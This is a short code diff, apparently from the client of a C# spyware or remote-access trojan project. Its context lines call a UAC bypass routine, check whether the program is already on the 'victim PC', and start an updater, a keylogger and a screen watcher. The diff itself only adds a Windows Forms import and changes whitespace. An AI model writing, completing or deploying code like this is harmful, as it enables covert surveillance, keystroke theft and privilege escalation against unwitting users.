@@ -6,6 +6,7 @@ using System.Linq;
 using System.Text;
 using System.Threading;
 using System.Threading.Tasks;
+using System.Windows.Forms;
 
 namespace Client
 {
@@ -22,7 +23,7 @@ namespace Client
 
             if (Utilities.Ranging.IsInEnumRange<Armitage.UAC.UACMethods>(UACMethod))
                 Armitage.UAC.UACBypass.QuickStart((Armitage.UAC.UACMethods)UACMethod);
-
+         
 #if !DEBUG
             /// Check if Application is already on victim PC.
             if (!Constants.IsInVictimPC())
@@ -48,7 +49,7 @@ namespace Client
             Updater.Start();
 
             /// Start loggers.
-            
+
             Armitage.Watchers.Keylogger.Start();
 
             Armitage.Watchers.Screen_Watcher.Start();
